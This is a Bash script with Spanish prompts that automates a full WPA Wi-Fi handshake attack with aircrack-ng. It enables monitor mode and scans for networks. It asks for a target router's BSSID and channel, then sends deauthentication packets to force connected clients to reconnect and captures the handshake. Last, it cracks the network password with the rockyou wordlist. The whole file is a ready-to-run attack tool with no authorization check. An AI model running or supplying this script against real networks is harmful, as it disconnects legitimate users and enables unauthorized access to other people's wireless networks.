#!/bin/bash
# Handshake Attack - Método clásico aircrack-ng

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && cd .. && pwd)"
WORDLIST="$SCRIPT_DIR/wordlists/rockyou.txt"

clear
echo -e "${RED}"
cat << "EOF"
╔══════════════════════════════════════════════════════════════╗
║              HANDSHAKE ATTACK (AIRCRACK-NG)                  ║
╚══════════════════════════════════════════════════════════════╝
EOF
echo -e "${NC}"

echo -e "${CYAN}Descripción:${NC}"
echo "  • Método tradicional más conocido"
echo "  • Captura 4-way handshake"
echo "  • ${YELLOW}Requiere clientes conectados${NC}"
echo "  • ${YELLOW}Requiere wordlist${NC}"
echo ""

# Detectar interfaz
echo -e "${CYAN}[*] Interfaces WiFi:${NC}"
airmon-ng
echo ""
read -p "Interfaz: " interface

# Modo monitor
echo -e "${YELLOW}[*] Activando modo monitor...${NC}"
airmon-ng check kill &>/dev/null
airmon-ng start $interface &>/dev/null
monitor="${interface}mon"
echo -e "${GREEN}[✓] $monitor activado${NC}"
echo ""

# Escanear
echo -e "${CYAN}[*] Escaneando redes (30 segundos)...${NC}"
echo -e "${YELLOW}[*] Anota BSSID y canal del objetivo${NC}"
echo ""
sleep 2

timeout 30 airodump-ng $monitor

# Objetivo
echo ""
read -p "BSSID del objetivo (MAC del router): " bssid
read -p "Canal: " canal

if [ -z "$bssid" ] || [ -z "$canal" ]; then
    echo -e "${RED}[!] Datos incompletos${NC}"
    airmon-ng stop $monitor &>/dev/null
    exit 1
fi

# Captura en background
echo ""
echo -e "${CYAN}[*] Capturando handshake de $bssid...${NC}"
echo -e "${YELLOW}[*] Cuando veas 'WPA handshake' presiona Ctrl+C${NC}"
echo ""
sleep 3

airodump-ng -c $canal --bssid $bssid -w captura $monitor &
AIRODUMP_PID=$!

# Esperar a que inicie
sleep 5

# Deauth attack
echo ""
echo -e "${RED}[*] Enviando deauth packets para forzar handshake...${NC}"
echo ""

timeout 30 aireplay-ng -0 10 -a $bssid $monitor

# Esperar handshake
echo ""
echo -e "${YELLOW}[*] Esperando handshake (60 segundos)...${NC}"
sleep 60

# Detener captura
kill $AIRODUMP_PID 2>/dev/null

# Verificar handshake
echo ""
echo -e "${CYAN}[*] Verificando handshake capturado...${NC}"

if [ ! -f "captura-01.cap" ]; then
    echo -e "${RED}[!] No se capturó handshake${NC}"
    airmon-ng stop $monitor &>/dev/null
    exit 1
fi

aircrack-ng captura-01.cap | grep "1 handshake"

if [ $? -ne 0 ]; then
    echo -e "${RED}[!] Handshake no capturado${NC}"
    echo -e "${YELLOW}[*] Reintenta o espera más tiempo${NC}"
    airmon-ng stop $monitor &>/dev/null
    exit 1
fi

echo -e "${GREEN}[✓] Handshake capturado!${NC}"
echo ""

# Wordlist
if [ ! -f "$WORDLIST" ]; then
    echo -e "${YELLOW}[!] Wordlist no encontrado${NC}"
    read -p "Ruta al wordlist: " custom_wordlist
    WORDLIST="$custom_wordlist"
fi

# Crackear
echo -e "${CYAN}[*] Crackeando con aircrack-ng...${NC}"
echo ""

aircrack-ng -w "$WORDLIST" captura-01.cap

# Restaurar
airmon-ng stop $monitor &>/dev/null

echo ""
read -p "Presiona Enter para continuar..."
